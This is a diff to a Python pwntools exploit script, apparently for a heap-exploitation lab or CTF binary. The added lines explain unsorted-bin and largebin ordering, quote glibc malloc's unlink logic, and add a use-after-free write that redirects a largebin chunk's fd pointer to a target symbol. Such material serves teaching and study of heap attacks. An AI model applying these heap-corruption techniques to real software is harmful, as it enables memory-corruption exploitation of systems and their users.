@@ -76,10 +76,32 @@ free(chunk_A)
 free(chunk_B)
 
 # 5. Sort into largebin.
+#    Since chunk A was freed at first, it gets the last member in unsortedbin:
+#    unsortedbin_head -> chunk_B -> chunk_A
+#    Since unsortedbin is traversed in reverse order while sorting, also the order
+#    gets reversed when putting them into their according largebin:
+#    largebin_head -> chunk_B -> chunk_A
 malloc(0x400)
 
+# The fact that we'll attack the largebin's fd pointer when launching an unsortedbin-attack, is
+# founded in following lines in malloc's source:\
+#
+# /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted.  */
+# if (victim != last (bin)
+#     && chunksize_nomask (victim) == chunksize_nomask (victim->fd))
+#   victim = victim->fd;
 
+# remainder_size = size - nb;
+# unlink (av, victim, bck, fwd);
+#
+# If the chunk is not the last in the skip list, it's succeeding chunk in that list get's unlinked.
+# Since it's a legit unlink, keep in mind, that safe unlinking checks have to be passed!
+# So chunk_A's fd pointer thanks to the uaf-write vulnerability can be overwritten, to point
+# to the target we'd like to overwrite.
 
+# Chunk A will end up as a skip-chunk in the 0x400-largebin
+# We don't subtract anything here, malloc deals with metadata when dealing with ptrs to chunks
+edit(chunk_A, p64(elf.sym.user))
 # =============================================================================
 
 io.interactive()
